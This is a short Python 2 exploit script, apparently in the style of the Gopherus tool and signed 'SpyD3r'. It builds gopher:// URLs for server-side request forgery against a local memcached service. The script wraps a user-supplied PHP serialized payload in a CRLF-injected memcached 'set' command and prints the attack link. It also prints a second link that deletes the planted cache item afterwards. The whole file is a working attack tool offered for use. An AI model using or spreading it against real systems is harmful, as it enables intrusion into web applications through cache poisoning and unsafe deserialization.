import urllib

print "\nThis is usable when you know Class and Variable name used by user\n"

code = raw_input("Give serialization payload\nexample: O:5:\"Hello\":0:{}   : ")


payload = "%0d%0aset SpyD3r 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"

finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

print "\nYour gopher link is ready to do SSRF : \n"
print "gopher://127.0.0.1:11211/_" + finalpayload
print "\nAfter everything done, you can delete memcached item by using this payload: \n"
print "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"
print "\n-----------Made-by-SpyD3r-----------\n"
